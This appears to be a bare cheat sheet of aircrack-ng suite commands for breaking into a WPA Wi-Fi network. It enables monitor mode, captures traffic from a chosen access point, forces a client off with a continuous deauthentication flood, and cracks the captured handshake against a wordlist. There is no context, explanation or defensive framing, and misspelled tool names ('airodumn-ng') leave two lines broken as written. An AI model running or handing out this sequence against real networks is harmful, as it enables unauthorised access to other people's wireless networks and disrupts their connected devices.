airmon-ng check kill
ifconfig wlan0 down
airmon-ng start wlan0
airodumn-ng --band bg mon0
airodumn-ng -w nameFile -c chanel --bssid bssid mon0 
aireplay-ng -0 0 -a bssid -c bssidCliente mon0
aircrack-ng file.cap -w dictionari.dic 
